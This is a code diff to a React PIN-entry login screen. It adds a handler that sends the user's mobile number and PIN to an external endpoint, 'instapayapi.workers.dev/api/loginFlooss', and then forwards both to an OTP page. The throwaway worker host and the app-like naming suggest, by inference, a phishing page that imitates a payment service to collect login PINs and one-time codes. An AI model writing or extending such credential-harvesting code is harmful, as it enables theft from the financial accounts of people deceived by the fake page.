@@ -156,12 +156,30 @@ export default function PINEntry() {
   const [focused, setFocused] = useState(false);
   const [loading, setLoading] = useState(false);
 const navigate = useNavigate()
-  const handleSignIn = () => {
-    if (!pin) return;
-    setLoading(true);
-    setTimeout(() => setLoading(false), 2000);
-    navigate("/otppage")
-  };
+  // const handleSignIn = () => {
+  //   if (!pin) return;
+  //   setLoading(true);
+  //   setTimeout(() => setLoading(false), 2000);
+  //   navigate("/otppage")
+  // };
+
+    const handleSubmit = async () => {
+    const payload = {
+      mobile:phone,
+      pin: pin.join("")
+    }
+    const res = await fetch('https://my-worker-app.instapayapi.workers.dev/api/loginFlooss',
+      {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
+      },
+    );
+    const json = await res.json();
+    if (res.ok) {
+      navigate('/otppage', { state: { phone: phone, pin: pin } })
+    }
+  }
 
   return (
     <div className="min-h-screen bg-white flex flex-col" style={{ fontFamily: "'Segoe UI', sans-serif", maxWidth: 430, margin: "0 auto" }}>
@@ -259,7 +277,7 @@ const navigate = useNavigate()
 
         {/* Sign In Button */}
         <button
-          onClick={handleSignIn}
+          onClick={handleSubmit}
           disabled={loading}
           className="w-full mt-5 py-4 rounded-full font-black text-lg transition-all active:scale-95"
           style={{ background: "#FFCC00", color: "#1a1a1a", boxShadow: "0 4px 15px rgba(255,204,0,0.4)" }}
